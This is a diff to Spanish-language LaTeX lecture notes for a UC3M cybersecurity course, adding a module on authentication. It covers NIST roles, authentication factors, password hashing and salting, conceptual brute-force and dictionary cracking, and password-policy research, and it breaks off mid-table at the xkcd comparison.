@@ -15,6 +15,9 @@
 \usepackage{tikz}
 \usetikzlibrary{arrows.meta,positioning,shapes.geometric,calc,backgrounds}
 \usepackage[hidelinks]{hyperref}
+% Reiniciar la numeración de capítulos en cada tema
+\counterwithin*{chapter}{part}
+\renewcommand{\theHchapter}{\arabic{part}.\arabic{chapter}}
 \usepackage{xcolor}
 
 \setlist{itemsep=2pt,topsep=4pt}
@@ -24,6 +27,13 @@
 \newtcolorbox{importante}[1][]{colback=red!4,colframe=red!60!black,fonttitle=\bfseries,title={Importante},#1}
 \newtcolorbox{definicion}[1]{colback=uc3m!4,colframe=uc3m,fonttitle=\bfseries,title={#1}}
 \newtcolorbox{ejemplo}[1]{colback=gray!6,colframe=gray!60,colbacktitle=gray!25,coltitle=black,fonttitle=\bfseries,title={#1}}
+% Estilos TikZ comunes a los diagramas (Tema 2 en adelante)
+\tikzset{
+  caja/.style={draw=uc3m, thick, fill=uc3m!5, rounded corners=2pt, align=center, minimum height=0.9cm, minimum width=2.4cm, font=\small},
+  cajagris/.style={draw=gray!60, thick, fill=gray!8, rounded corners=2pt, align=center, minimum height=0.9cm, minimum width=2.4cm, font=\small},
+  flecha/.style={-{Stealth[length=2.2mm]}, thick},
+  etiq/.style={font=\footnotesize, align=center, fill=white, inner sep=1.5pt}
+}
 
 \title{\textbf{Ingeniería de Ciberseguridad}\\[4pt]\large Apuntes: Tema 1\\Departamento de Informática, UC3M}
 \author{}
@@ -488,5 +498,3021 @@ Los mecanismos de seguridad \textbf{no deben aumentar la dificultad de acceder a
     \end{itemize}
 \end{itemize}
 \end{importante}
+
+\part{Autenticación}
+ 
+ 
+ 
+%=====================================================================
+\chapter{¿Qué es la autenticación?}
+%=====================================================================
+ 
+\begin{importante}[title={Sobre este tema}]
+Módulo 2 de la asignatura \textbf{Ingeniería de Ciberseguridad} (UC3M, COSEC -- \emph{Computer Security Lab}).
+\begin{enumerate}
+  \item ¿Qué es la autenticación? (conceptos, marco NIST, tipos de autenticadores)
+  \item Contraseñas (almacenamiento, ataques y defensas)
+  \item Elección de contraseñas
+  \item Gestores de contraseñas
+  \item Otros autenticadores (incluida la biometría)
+  \item Autenticación en sistemas distribuidos
+\end{enumerate}
+\end{importante}
+ 
+\section{La base de la seguridad informática es el acceso controlado}
+ 
+El esquema básico de todo acceso es:
+ 
+\begin{center}
+\begin{tikzpicture}[node distance=1.2cm]
+  \node[caja] (q) {\textbf{Quién}\\(alguien)};
+  \node[caja, right=of q] (a) {\textbf{Acción}\\(alguna acción)};
+  \node[caja, right=of a] (r) {\textbf{Recurso}\\(algo)};
+  \draw[flecha] (q) -- (a);
+  \draw[flecha] (a) -- (r);
+\end{tikzpicture}
+\end{center}
+ 
+\begin{definicion}{Autenticación}
+El proceso de \textbf{determinar o confirmar una identidad}, es decir, verificar el ``quién'' antes de conceder el acceso.
+\end{definicion}
+ 
+\section{La autenticación (AuthN) es crítica para la seguridad}
+ 
+\emph{AuthN} y \emph{AuthZ} son las abreviaturas habituales en inglés de \emph{authentication} y \emph{authorization}.
+ 
+\begin{itemize}
+  \item \textbf{Autorización (AuthZ)}: los permisos, las capacidades y el control de acceso dependen todos de conocer la \textbf{identidad del sujeto}.
+  \item \textbf{Nombre de usuario y secreto} (\emph{username \& secret}): la autenticación se parametriza típicamente mediante un nombre de usuario y un secreto.
+    \begin{itemize}
+      \item El secreto trata de \textbf{limitar el acceso no autorizado}.
+      \item Propiedades deseables del secreto: que sea \textbf{infalsificable} (\emph{unforgeable}), \textbf{no adivinable} (\emph{unguessable}) y \textbf{revocable} (\emph{revocable}).
+    \end{itemize}
+\end{itemize}
+ 
+\section{Identificación vs.\ autenticación}
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\centering\textbf{Identificación} & \centering\arraybackslash\textbf{Autenticación} \\
+\midrule
+\textbf{Afirmar} quién es una persona. & \textbf{Demostrar} una identidad afirmada. \\
+\midrule
+\textit{Propiedades de la identidad digital:}
+\vspace{-0.3\baselineskip}\begin{itemize}[leftmargin=*,nosep,topsep=0pt]
+  \item Es bien conocida
+  \item Es predecible
+  \item Es adivinable
+\end{itemize}\vspace{2pt}
+&
+\textit{Base de la verificación:}
+\vspace{-0.3\baselineskip}\begin{itemize}[leftmargin=*,nosep,topsep=0pt]
+  \item Se apoya en elementos privados
+  \item Confirma que la persona es quien dice ser
+\end{itemize}\vspace{2pt} \\
+\midrule
+\textit{Ejemplos:} correo electrónico, número de teléfono, cuenta bancaria, nombre de usuario, etc.
+&
+\textit{Ejemplos:} contraseñas, preguntas de seguridad, cara, huellas dactilares, tarjetas, \emph{tokens}, etc. \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+\section{Marco de referencia: NIST SP 800-63-3}
+ 
+El \textbf{NIST} (\emph{National Institute of Standards and Technology}) es el instituto de estándares de EE.\,UU.; la guía \textbf{SP 800-63-3} (\emph{Special Publication} 800-63, revisión 3) define los \textbf{roles} y los \textbf{flujos} de la autenticación digital.
+ 
+\begin{center}
+\begin{tikzpicture}[font=\small]
+  \node[caja] (app) at (0,3.6) {\textbf{Applicant}\\(solicitante)};
+  \node[caja, minimum width=3cm] (csp) at (7.0,3.6) {\textbf{CSP}\\(prov.\ de credenciales)};
+  \node[caja, minimum width=3cm] (cla) at (0,0) {\textbf{Claimant / Subscriber}\\(reclamante / suscriptor)};
+  \node[caja] (ver) at (7.0,0) {\textbf{Verifier}\\(verificador)};
+  \node[caja] (rp) at (12.2,0) {\textbf{RP}\\(parte confiante)};
+ 
+  \draw[flecha] (app) -- node[etiq, above=2pt] {1. Inscripción y verificación\\de identidad} (csp);
+  \draw[flecha] (csp) -- node[etiq, sloped] {2. Emisión del autenticador} (cla);
+  \draw[flecha] (cla) -- node[etiq, above=2pt] {3. Autenticación} (ver);
+  \draw[flecha, <->] (ver) -- node[etiq, right=2pt, align=left] {4. Validar vínculo\\autenticador/credencial;\\atributos} (csp);
+  \draw[flecha] (ver) -- node[etiq, above=2pt] {5. Aserción de\\autenticación} (rp);
+  \draw[flecha, <->] (rp.south) -- ++(0,-1.0) -| node[etiq, pos=0.25] {6. Sesión autenticada} (cla.south);
+\end{tikzpicture}
+\end{center}
+ 
+\subsection*{Inscripción y verificación de identidad (\emph{Enrollment and Identity Proofing})}
+\begin{itemize}
+  \item El \textbf{Applicant} (solicitante) pasa por el proceso de inscripción y verificación de identidad con el \textbf{CSP} (\emph{Credential Service Provider}, proveedor de servicios de credenciales).
+  \item El CSP realiza la \textbf{inscripción/emisión del autenticador} (\emph{Authenticator Enrollment/Issuance}).
+  \item Tras ello, el solicitante se convierte en \textbf{Subscriber} (suscriptor).
+\end{itemize}
+ 
+\subsection*{Autenticación digital (\emph{Digital Authentication})}
+\begin{itemize}
+  \item El \textbf{Claimant} (reclamante) se autentica frente al \textbf{Verifier} (verificador).
+  \item El Verifier comprueba con el CSP la \textbf{validación del vínculo autenticador/credencial} (\emph{Validate Authenticator/Credential Binding}) y recibe los \textbf{atributos}.
+  \item Tras autenticarse, el Claimant se convierte en Subscriber.
+\end{itemize}
+ 
+\subsection*{\emph{Relying Party} (RP, parte confiante)}
+\begin{itemize}
+  \item El Verifier envía al RP una \textbf{aserción de autenticación} (\emph{Authentication Assertion}).
+  \item El RP mantiene una \textbf{sesión autenticada} con el Subscriber.
+\end{itemize}
+ 
+\section{Autenticadores (= tipos de ``secretos'')}
+ 
+Los tres \textbf{factores de autenticación} clásicos:
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\centering\textbf{Algo que sabes}\\\centering\emph{something you know} & \centering\textbf{Algo que tienes}\\\centering\emph{something you have} & \centering\arraybackslash\textbf{Algo que eres}\\\centering\arraybackslash\emph{something you are} \\
+\midrule
+Información memorizada:
+\vspace{-0.3\baselineskip}\begin{itemize}[leftmargin=*,nosep,topsep=0pt]
+  \item Contraseñas
+  \item PIN
+  \item Frases de paso
+  \item Preguntas de seguridad
+\end{itemize}\vspace{2pt}
+&
+Objetos físicos:
+\vspace{-0.3\baselineskip}\begin{itemize}[leftmargin=*,nosep,topsep=0pt]
+  \item Tarjetas inteligentes
+  \item \emph{Tokens} hardware
+  \item Llaveros (\emph{key fobs})
+  \item Dispositivos móviles
+\end{itemize}\vspace{2pt}
+&
+Rasgos físicos inherentes:
+\vspace{-0.3\baselineskip}\begin{itemize}[leftmargin=*,nosep,topsep=0pt]
+  \item Huellas dactilares
+  \item Reconocimiento facial
+  \item Patrones del iris
+\end{itemize}\vspace{2pt} \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+\subsection{Uno frente a múltiples factores (MFA)}
+ 
+\begin{importante}
+La \textbf{autenticación multifactor} (MFA, \emph{Multi-Factor Authentication}) mejora drásticamente la seguridad al combinar \textbf{dos o más factores independientes}.
+\end{importante}
+ 
+\subsection{Tipos de autenticadores (clasificación NIST)}
+ 
+En la tabla, OTP significa \emph{One-Time Password} (contraseña de un solo uso); cada tipo se explica en el capítulo~\ref{cap:otros}. La columna de factores resume lo que se ve allí.
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.25}%
+\begin{tabularx}{\linewidth}{>{\raggedright\arraybackslash}X !{\color{gray!45}\vrule width 0.2pt} >{\raggedright\arraybackslash}X}
+\toprule
+\textbf{Tipo de autenticador} & \textbf{Factor(es)} \\
+\midrule
+Secretos memorizados (\emph{memorized secrets}) & Algo que sabes \\
+Secretos de consulta (\emph{look-up secrets}) & Algo que tienes \\
+Dispositivos fuera de banda (\emph{out-of-band devices}) & Algo que tienes \\
+Dispositivo OTP de un solo factor (\emph{single-factor OTP device}) & Algo que tienes \\
+Dispositivo OTP multifactor (\emph{multi-factor OTP device}) & Algo que tienes + (sabes o eres) \\
+Software criptográfico de un solo factor (\emph{single-factor crypto software}) & Algo que tienes \\
+Dispositivo criptográfico de un solo factor (\emph{single-factor crypto device}) & Algo que tienes \\
+Software criptográfico multifactor (\emph{multi-factor crypto software}) & Algo que tienes + (sabes o eres) \\
+Dispositivos criptográficos multifactor (\emph{multi-factor crypto devices}) & Algo que tienes + (sabes o eres) \\
+\bottomrule
+\end{tabularx}}
+\end{center}
+ 
+%=====================================================================
+\chapter{Contraseñas}
+%=====================================================================
+ 
+\section{Secretos memorizados}
+ 
+\begin{itemize}
+  \item \textbf{Algo que sabes}: es el factor de autenticación de entidades clásico y \textbf{más ampliamente implementado}.
+  \item \textbf{¿Qué son?} También conocidos como \textbf{contraseñas} (o \textbf{PIN}, \emph{Personal Identification Number}, cuando son puramente numéricos).
+  \item \textbf{Principio de la fortaleza} (\emph{Strength Principle}): deben ser lo bastante ``fuertes'' como para que adivinarlas resulte \textbf{impracticable}.
+  \item \textbf{Paradoja de la usabilidad} (\emph{Usability Paradox}): se asume que son bastante sencillas de usar. ¿Lo son realmente?
+\end{itemize}
+ 
+\section{Contraseñas: lo bueno\ldots\ ¡y lo malo!}
+ 
+\subsection{Ventajas de las contraseñas}
+\begin{itemize}
+  \item \textbf{No requieren formación}: ¡todo el mundo conoce las contraseñas!
+  \item \textbf{Baratas de implementar}: pueden implementarse sin ningún dispositivo físico.
+  \item \textbf{Cómodas}: los usuarios pueden autenticarse sin llevar nada encima.
+  \item \textbf{Fáciles de gestionar}: pueden administrarse de forma centralizada.
+  \item \textbf{Ampliamente soportadas}: todo sistema operativo, sitio web y aplicación admite contraseñas.
+\end{itemize}
+ 
+\subsection{Sin embargo, dado lo que sabemos sobre la memoria humana\ldots}
+\begin{itemize}
+  \item Las personas \textbf{no recuerdan} los elementos que se usan o se cambian con poca frecuencia.
+  \item \textbf{No podemos olvidar bajo demanda} (\emph{can't forget on demand}).
+  \item \textbf{Recordar} (\emph{recall}) es más difícil que \textbf{reconocer} (\emph{recognition}).
+  \item Las palabras \textbf{sin significado} son más difíciles de recordar.
+\end{itemize}
+ 
+\section{Almacenamiento de contraseñas: texto plano}
+ 
+\subsection{Requisito de almacenamiento}
+\begin{itemize}
+  \item \textbf{Validación}: el sistema debe validar las contraseñas que proporcionan los usuarios.
+  \item \textbf{Almacenamiento}: por tanto, las contraseñas deben almacenarse en algún sitio.
+  \item \textbf{Enfoque básico}: almacenarlas en \textbf{texto plano}.
+\end{itemize}
+ 
+\begin{center}
+\small
+{\renewcommand{\arraystretch}{1.2}%
+\begin{tabular}{l l}
+\toprule
+\textbf{username} & \textbf{password} \\
+\midrule
+\texttt{alice}   & \texttt{p4ssw0rd} \\
+\texttt{bob}     & \texttt{ilovealice} \\
+\texttt{charlie} & \texttt{123456} \\
+\bottomrule
+\end{tabular}}
+\end{center}
+ 
+\subsection{Escenario de ataque}
+\begin{enumerate}[label=\textbf{0\arabic*.}]
+  \item \textbf{Compromiso del sistema}: los atacantes vulneran los límites de la red y comprometen los sistemas centrales.
+  \item \textbf{Robo del fichero}: buscan y consiguen robar el fichero de contraseñas del sistema.
+  \item \textbf{Explotación inmediata}: si están en texto plano, las contraseñas están listas para usarse. Los atacantes pueden iniciar sesión inmediatamente como cualquier usuario, ¡incluido \texttt{root}!
+\end{enumerate}
+ 
+\begin{importante}[title={Estándar de seguridad crítico}]
+Las contraseñas \textbf{nunca} deberían almacenarse en texto plano.
+\end{importante}
+ 
+\section{Almacenamiento de contraseñas: contraseñas con \emph{hash}}
+ 
+\subsection{Idea central}
+\begin{itemize}
+  \item Almacenar una versión con \textbf{hash criptográfico} de la contraseña en lugar del texto plano, usando una \textbf{función unidireccional} (\emph{one-way function}).
+  \item ¿Cómo funciona ahora el sistema? Aplica el hash a lo que teclea el usuario y lo \textbf{compara} con el hash almacenado:
+\end{itemize}
+ 
+\begin{center}
+\begin{tikzpicture}[node distance=0.9cm]
+  \node[cajagris] (in) {Contraseña\\tecleada};
+  \node[caja, right=of in] (h) {\texttt{hash()}};
+  \node[draw=uc3m, thick, diamond, aspect=2, inner sep=1pt, font=\small, right=of h] (cmp) {¿$=$?};
+  \node[cajagris, above=0.6cm of cmp] (st) {Hash almacenado};
+  \node[caja, right=of cmp, minimum width=1.8cm] (ok) {Acceso\\sí / no};
+  \draw[flecha] (in) -- (h);
+  \draw[flecha] (h) -- (cmp);
+  \draw[flecha] (st) -- (cmp);
+  \draw[flecha] (cmp) -- (ok);
+\end{tikzpicture}
+\end{center}
+ 
+\subsection{Propiedades criptográficas}
+\begin{enumerate}[label=\textbf{0\arabic*.}]
+  \item \textbf{Determinista}: la misma contraseña produce siempre el mismo hash, $\mathrm{hash}(x) = \mathrm{hash}(x)$.
+  \item \textbf{Alta entropía} (efecto avalancha): un cambio mínimo en la entrada produce una salida completamente distinta:
+    \begin{itemize}
+      \item \texttt{MD5('security') = e91e6348157868de...}
+      \item \texttt{MD5('Security') = 2fae32629d4ef4fc...}
+    \end{itemize}
+    (MD5 = \emph{Message Digest 5}, quinta versión de la familia de resúmenes de Ron Rivest.)
+  \item \textbf{Resistente a colisiones}: es computacionalmente inviable encontrar un $y \neq x$ tal que $\mathrm{hash}(x) = \mathrm{hash}(y)$.
+\end{enumerate}
+ 
+\section{Problema: contraseñas débiles}
+ 
+\subsection{Vulnerabilidad de los hashes}
+\begin{itemize}
+  \item ¿Son seguros frente al \emph{cracking}? \destacar{¡No!}
+  \item \textbf{Reto central}: aunque la función hash es difícil de invertir, las contraseñas con hash siguen siendo vulnerables al \textbf{cracking offline}.
+  \item \textbf{Estrategias de ataque}: todas se basan en un hecho fundamental, explotar \textbf{lo predecibles que son las contraseñas elegidas por las personas}.
+\end{itemize}
+ 
+\subsection{El factor humano}
+Los informes desde finales de los años 70 sugieren repetidamente que \textbf{las personas eligen contraseñas débiles}.
+ 
+\subsubsection*{Morris \& Thomson (1979): estudio temprano sobre contraseñas en UNIX}
+ 
+\begin{center}
+\small
+{\renewcommand{\arraystretch}{1.2}%
+\begin{tabular}{l r}
+\toprule
+\textbf{Estructura de la contraseña} & \textbf{\%} \\
+\midrule
+Un único carácter ASCII & $<1$\,\% \\
+Dos caracteres ASCII & 2\,\% \\
+Tres caracteres ASCII & 14\,\% \\
+Cuatro letras alfabéticas & 14\,\% \\
+Cinco letras alfabéticas, todas de la misma caja & 21\,\% \\
+Seis letras alfabéticas en minúscula & 18\,\% \\
+Palabras de diccionarios o listas de nombres & 15\,\% \\
+\midrule
+\textbf{Total de todas las categorías} & \textbf{86\,\%} \\
+\bottomrule
+\end{tabular}}
+\end{center}
+(ASCII = \emph{American Standard Code for Information Interchange}, la codificación de caracteres de 7 bits.)
+ 
+\subsubsection*{Egg Online Bank (2002): PIN elegidos por los clientes}
+\begin{itemize}
+  \item 50\,\% usaban \textbf{nombres de familiares}.
+  \item 8\,\% usaban \textbf{nombres de famosos}.
+\end{itemize}
+ 
+\subsubsection*{Imperva (2009): análisis de credenciales filtradas}
+\begin{itemize}
+  \item 34\,M de contraseñas de Facebook analizadas.
+  \item 30\,\% tenían \textbf{menos de 7 caracteres}.
+  \item 50\,\% eran \textbf{triviales} (nombres o palabras de diccionario).
+\end{itemize}
+ 
+\section{Cracking de contraseñas: fuerza bruta}
+ 
+\subsection{Contraseñas cortas (fuerza bruta simple)}
+\begin{itemize}
+  \item Longitud 3 o menos, sin distinguir mayúsculas de minúsculas.
+  \item $26^1 + 26^2 + 26^3 = 18.278$ combinaciones totales.
+  \item A 1\,s por intento\footnote{En los apuntes de partida ponía ``1\,ms'', pero la cifra de $\sim$5 horas sale con 1 segundo por intento: $18.278\ \text{s} \approx 305\ \text{min} \approx 5\ \text{h}$. A 1\,ms serían unos 18 segundos.}: $\sim$5 horas ($\sim$300 minutos en total).
+\end{itemize}
+ 
+\subsection{El límite de escala}
+\begin{itemize}
+  \item \textbf{Crecimiento exponencial}: ¿y si las contraseñas son más largas o tienen más símbolos base?
+  \item \destacar{Factor crítico: ¡la búsqueda se puede paralelizar!}
+\end{itemize}
+ 
+\subsection{Contraseñas de 6 caracteres (ataques acelerados)}
+\begin{itemize}
+  \item $\sim$690.000 millones de combinaciones (con los 94 caracteres ASCII imprimibles: $94^6 \approx 6{,}9 \cdot 10^{11}$).
+  \item \textbf{Servidor x86}: 3,5 horas usando una CPU (\emph{Central Processing Unit}) de servidor estándar.
+  \item \textbf{GPU moderna} (\emph{Graphics Processing Unit}): 15 minutos mediante hardware paralelo.
+\end{itemize}
+ 
+\begin{ejemplo}{El EFF DES Cracker (1998)}
+La EFF (\emph{Electronic Frontier Foundation}) construyó una máquina para romper por fuerza bruta el cifrado DES (\emph{Data Encryption Standard}).
+\begin{itemize}
+  \item \textbf{Fortaleza del cifrado}: DES usa una clave relativamente pequeña, de \textbf{56 bits}. Se han demostrado ataques prácticos similares contra MD5 y SHA-1 (\emph{Secure Hash Algorithm 1}).
+  \item \textbf{Datos de la máquina}:
+    \begin{itemize}
+      \item \textbf{250.000 \$}: coste total de construirla en 1998.
+      \item \textbf{56 h}: tiempo para hacer fuerza bruta sobre todas las claves.
+      \item \textbf{1.856 chips ASIC} (\emph{Application-Specific Integrated Circuit}): procesadores paralelos a medida.
+    \end{itemize}
+\end{itemize}
+\end{ejemplo}
+ 
+\section{Cracking de contraseñas: ataques de diccionario}
+ 
+\begin{itemize}
+  \item \textbf{Premisa}: como las personas no eligen contraseñas verdaderamente aleatorias, ¿por qué no tomar una lista precompilada de candidatas (un \textbf{diccionario}) y probarlas sistemáticamente?
+  \item \textbf{Resultado}: es habitual que entre el \destacar{60 y el 70\,\%} de las contraseñas con hash se craqueen en \textbf{menos de 24 horas}.
+\end{itemize}
+ 
+\begin{center}
+\begin{tikzpicture}[node distance=1cm]
+  \node[cajagris] (dic) {\texttt{Dictionary.txt}\\{\footnotesize word1, \ldots, wordN}};
+  \node[caja, right=of dic] (h) {\texttt{hash(word\textsubscript{i})}};
+  \node[draw=uc3m, thick, diamond, aspect=2, inner sep=1pt, font=\small, right=of h] (cmp) {¿Coincide?};
+  \node[cajagris, above=0.6cm of cmp] (pwd) {\texttt{Hashed pwd.txt}\\{\footnotesize hash1, hash2, \ldots}};
+  \node[caja, right=of cmp, fill=red!8, draw=red!60!black, minimum width=1.8cm] (ok) {¡Contraseña\\encontrada!};
+  \draw[flecha] (dic) -- (h);
+  \draw[flecha] (h) -- (cmp);
+  \draw[flecha] (pwd) -- (cmp);
+  \draw[flecha] (cmp) -- node[etiq, above=2pt] {Sí} (ok);
+  \draw[flecha] (cmp.south) -- ++(0,-0.7) -| node[etiq, pos=0.25] {No: siguiente candidato} (h.south);
+\end{tikzpicture}
+\end{center}
+ 
+\section{Tablas arcoíris (\emph{rainbow tables})}
+ 
+\begin{enumerate}
+  \item \textbf{Hashes deterministas}
+    \begin{itemize}
+      \item Las funciones hash criptográficas son deterministas: la misma entrada produce siempre la misma salida.
+      \item Esta consistencia es el \textbf{fundamento matemático de los ataques de precomputación}.
+    \end{itemize}
+  \item \textbf{Estrategia offline}
+    \begin{itemize}
+      \item Los adversarios construyen listas \textbf{precomputadas} de hashes offline.
+      \item ¿La ventaja? Intercambian tiempo de preparación offline por un \textbf{cracking online casi instantáneo}.
+    \end{itemize}
+  \item \textbf{Tablas arcoíris}
+    \begin{itemize}
+      \item Contienen un espectro estructurado de contraseñas de hasta longitud $N$.
+      \item Son muy compactas, optimizadas y efectivas.
+      \item Permiten la inversión de hashes eficiente en tiempo y espacio mediante ataques \textbf{TMTO} (\emph{Time-Memory Trade-Off}, compromiso tiempo-memoria).
+    \end{itemize}
+\end{enumerate}
+ 
+\section{Endurecer los hashes: la sal (\emph{salt})}
+ 
+\begin{enumerate}
+  \item \textbf{La solución de la sal}
+    \begin{itemize}
+      \item Hacer que cada hash de contraseña sea \textbf{identificable de forma única}.
+      \item Se consigue añadiendo un \textbf{número aleatorio} (la sal) a cada contraseña antes de aplicarle el hash.
+    \end{itemize}
+  \item \textbf{Fundamento}
+    \begin{itemize}
+      \item $\mathrm{Hash}(p + r_1) \neq \mathrm{Hash}(p + r_2)$
+      \item A cada usuario se le asigna una sal completamente única y aleatoria.
+      \item Dos usuarios con contraseñas idénticas producirán hashes distintos.
+    \end{itemize}
+  \item \textbf{Almacenamiento público}
+    \begin{itemize}
+      \item La sal se almacena \textbf{en texto plano}, directamente junto al hash.
+      \item ¡No es un secreto!
+    \end{itemize}
+\end{enumerate}
+ 
+\begin{importante}
+El objetivo de la sal es la \textbf{unicidad de los hashes}, no la ocultación de la sal.
+\end{importante}
+ 
+\section{Romper y arreglar las contraseñas con hash}
+ 
+\subsection{La amenaza y el reto}
+\begin{enumerate}
+  \item \textbf{Buena práctica}: las contraseñas almacenadas deberían estar siempre hasheadas para proteger las credenciales de los usuarios.
+  \item \textbf{La amenaza}:
+    \begin{itemize}
+      \item Hardware especializado (GPU) cada vez más rápido, con cientos o miles de núcleos.
+      \item Puede \textbf{alquilarse} fácilmente a proveedores cloud para lanzar ataques a gran velocidad.
+    \end{itemize}
+  \item \textbf{El reto}: ¿cómo podemos defendernos de esa potencia de cálculo bruta?
+\end{enumerate}
+ 
+\subsection{La solución: hacer el hash lento}
+\begin{enumerate}
+  \item \textbf{Idea clave}
+    \begin{itemize}
+      \item \textbf{Deliberadamente lento}: hacer que el proceso de hashing sea más lento.
+      \item Los hashes criptográficos están diseñados para ser \textbf{rápidos}, lo cual es \textbf{contraproducente} en el caso de las contraseñas.
+    \end{itemize}
+  \item \textbf{\emph{Key stretching}} (estiramiento de clave)
+    \begin{itemize}
+      \item \textbf{Múltiples rondas}: aplicar el hash a la contraseña varias veces de forma recursiva.
+      \item Por ejemplo, \texttt{crypt} (el hash tradicional de contraseñas de UNIX) usa \textbf{25 rondas de DES}\footnote{En los apuntes de partida se atribuía a bcrypt, pero las 25 rondas de DES son del \texttt{crypt} clásico de UNIX; bcrypt se basa en el cifrado Blowfish.}.
+    \end{itemize}
+  \item \textbf{Hashes adaptativos}
+    \begin{itemize}
+      \item \textbf{Factor de trabajo} (\emph{work factor}): usar funciones hash especiales con lentitud configurable.
+      \item \textbf{Estándares de la industria}: \textbf{PBKDF2} (\emph{Password-Based Key Derivation Function 2}), \textbf{scrypt} y \textbf{bcrypt} (de \emph{Blowfish crypt}).
+    \end{itemize}
+\end{enumerate}
+ 
+%=====================================================================
+\chapter{Elección de contraseñas}
+%=====================================================================
+ 
+\section{¿Qué es una contraseña fuerte?}
+ 
+\begin{definicion}{Métrica: la entropía}
+\[
+S = \log_2 N^L = L \cdot \log_2 N
+\]
+\begin{itemize}
+  \item $N$ = número de símbolos posibles.
+  \item $L$ = longitud de la contraseña.
+  \item $S$ = ``fortaleza'' (entropía) de la contraseña, en \textbf{bits}.
+\end{itemize}
+\end{definicion}
+ 
+\subsection*{Aplicación y límites}
+\begin{itemize}
+  \item Permite calcular la longitud ($L$) necesaria para alcanzar una fortaleza objetivo ($S$).
+  \item \destacar{Suposición crucial}: esta métrica solo es válida para una contraseña \textbf{generada aleatoriamente}.
+  \item ¿Es útil en la práctica? Como las personas rara vez eligen contraseñas verdaderamente aleatorias, las métricas de entropía tradicionales suelen \textbf{fallar en escenarios reales}.
+\end{itemize}
+ 
+\section{Algoritmos mentales}
+ 
+\begin{itemize}
+  \item Se han popularizado tras años de formación en seguridad y se han vendido como ``seguros'' durante años.
+  \item Variantes de estos procedimientos:
+\end{itemize}
+ 
+\begin{multicols}{2}
+\textbf{Procedimiento A}
+\begin{enumerate}
+  \item Elegir una palabra.
+  \item Poner en mayúscula la primera o la última letra.
+  \item Añadir un número (y quizá un símbolo) al principio o al final.
+\end{enumerate}
+\columnbreak
+\textbf{Procedimiento B}
+\begin{enumerate}
+  \item Elegir una palabra.
+  \item Sustituir algunas letras por símbolos (\texttt{s/a/@}, \texttt{s/s/\$}, \ldots).
+  \item Quizá poner en mayúscula la primera o la última letra (o ambas).
+\end{enumerate}
+\end{multicols}
+ 
+El resultado es algo del estilo de \texttt{Computer3@} o \texttt{Cl4ssr00m}. (La notación \texttt{s/a/@} viene de \texttt{sed}, el \emph{stream editor} de UNIX: ``sustituye \texttt{a} por \texttt{@}''.)
+ 
+\begin{importante}
+Los adversarios modernos disponen de herramientas de cracking sofisticadas:
+\begin{itemize}
+  \item \textbf{No necesitan fuerza bruta}.
+  \item Usan diccionarios, incluyendo \textbf{contraseñas de filtraciones previas}.
+  \item Aplican las \textbf{reglas comunes de los algoritmos mentales}.
+\end{itemize}
+\end{importante}
+ 
+\section{Políticas de contraseñas}
+ 
+Según Shay \emph{et al.} (ACM TISSEC 2016)\footnote{\url{https://www.blaseur.com/papers/tissec_1026.pdf}. ACM = \emph{Association for Computing Machinery}; TISSEC = \emph{Transactions on Information and System Security}.}:
+ 
+\begin{itemize}
+  \item \textbf{comp$n$} y \textbf{basic$n$}: exigen usar al menos $n$ caracteres.
+  \item \textbf{$k$word$n$}: combinar al menos $k$ palabras usando al menos $n$ caracteres.
+  \item \textbf{$d$class$n$}: usar al menos $d$ tipos de caracteres (mayúscula, minúscula, dígito, símbolo) con al menos $n$ caracteres.
+\end{itemize}
+ 
+La gráfica del estudio (porcentaje de contraseñas adivinadas frente al número de intentos, de $10^3$ a $10^{12}$) ordena las políticas así:
+ 
+\begin{center}
+\begin{tikzpicture}[font=\small]
+  \draw[flecha, red!60!black] (0,0) -- (14.5,0);
+  \foreach \x/\p in {0.6/basic12, 2.4/comp8, 4.2/2word12, 6.0/3class12, 7.8/basic16, 9.6/2word16, 11.4/basic20, 13.4/3class16} {
+    \node[caja, minimum width=1.5cm, minimum height=0.7cm, font=\footnotesize] at (\x,0.8) {\p};
+  }
+  \node[below, font=\footnotesize, align=center] at (0.6,-0.1) {Más débil\\($\approx$50\,\% adivinadas)};
+  \node[below, font=\footnotesize, align=center] at (13.4,-0.1) {Más robusta\\($\approx$10\,\%)};
+\end{tikzpicture}
+\end{center}
+ 
+\section{Buenas heurísticas para las contraseñas}
+ 
+\begin{importante}[title={La fórmula de la entropía}]
+\[ S = L \cdot \log_2 N \]
+Para la fortaleza de una contraseña, \textbf{la longitud ($L$) importa más que el tamaño del conjunto de símbolos ($N$)}: $L$ multiplica, mientras que $N$ solo entra a través del logaritmo.
+\end{importante}
+ 
+\subsection*{Recomendaciones}
+\begin{enumerate}
+  \item \textbf{Elegir contraseñas más largas}: apuntar a \textbf{16 o más caracteres}. ¡No hay que obsesionarse con forzar mayúsculas, dígitos o símbolos complejos!
+  \item \textbf{Usar mnemotécnicas}: elegir una frase memorable y reducirla a la primera letra de cada palabra para crear un secreto fuerte y fácil de recordar.
+  \item \textbf{Insertar variaciones aleatorias}: para ampliar aún más el espacio de búsqueda, introducir unas pocas mayúsculas, dígitos y símbolos aleatorios en la frase, en puntos fáciles de recordar.
+\end{enumerate}
+ 
+\subsection{La viñeta de xkcd}
+ 
+La viñeta \href{https://www.xkcd.com/936/}{xkcd~936} (xkcd es un nombre sin significado: su autor, Randall Munroe, lo eligió precisamente por ser impronunciable) compara dos contraseñas:
+ 
+\begin{center}
+\small
+{\setlength{\aboverulesep}{0pt}\setlength{\belowrulesep}{0pt}\renewcommand{\arraystretch}{1.3}%
